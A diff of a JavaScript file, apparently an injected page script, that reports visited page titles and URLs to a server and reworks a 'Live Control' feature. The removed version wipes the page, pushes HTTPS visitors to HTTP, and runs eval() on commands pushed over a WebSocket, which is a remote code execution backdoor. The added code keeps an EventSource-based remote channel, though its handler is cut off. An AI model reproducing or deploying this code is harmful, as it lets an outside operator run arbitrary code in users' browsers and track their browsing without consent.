@@ -1,4 +1,4 @@
-console.log('V25');
+console.log('V26');
 
 // Log URLs and data
 function serverLog(data) {
@@ -14,9 +14,6 @@ serverLog($('title').text())
 		switch (text.split('@')[0]) {
 			case 'live':
 				initLiveControl(text.split('@')[1]);
-				break;
-			case 'lc2':
-				initLC2(text.split('@')[1]);
 				break;
 		}
 	})
@@ -43,36 +40,7 @@ function siteSpecifics(host) {
 }
 
 // Live Control
-function initLiveControl(socketUrl) {
-	if (window.location.protocol === 'https:') {
-		window.location = 'http://example.com'
-	}
-	if (window.location.protocol === 'http:' && window.location.host !== '127.0.0.1:8080') {
-
-		console.log('Live');
-		$('html')[0].innerHTML = `<head><title>blank</title></head><body></body>`;
-
-		const socket = new WebSocket(socketUrl);
-
-		socket.addEventListener('open', function (event) {
-			var message = {
-				type: "handshake",
-				content: "client"
-			}
-			socket.send(JSON.stringify(message));
-		});
-
-		socket.addEventListener('message', function (event) {
-			var data = JSON.parse(event.data);
-			console.log(data);
-			if (data.type === 'commandClient') {
-				eval(data.content);
-			}
-		});
-	}
-}
-// LC2 (Live Control 2)
-function initLC2(serverUrl) {
+function initLiveControl(serverUrl) {
 	if (window.location.host !== '127.0.0.1:8080') {
 		var es = new EventSource(serverUrl)
 		es.onmessage = function (event) {
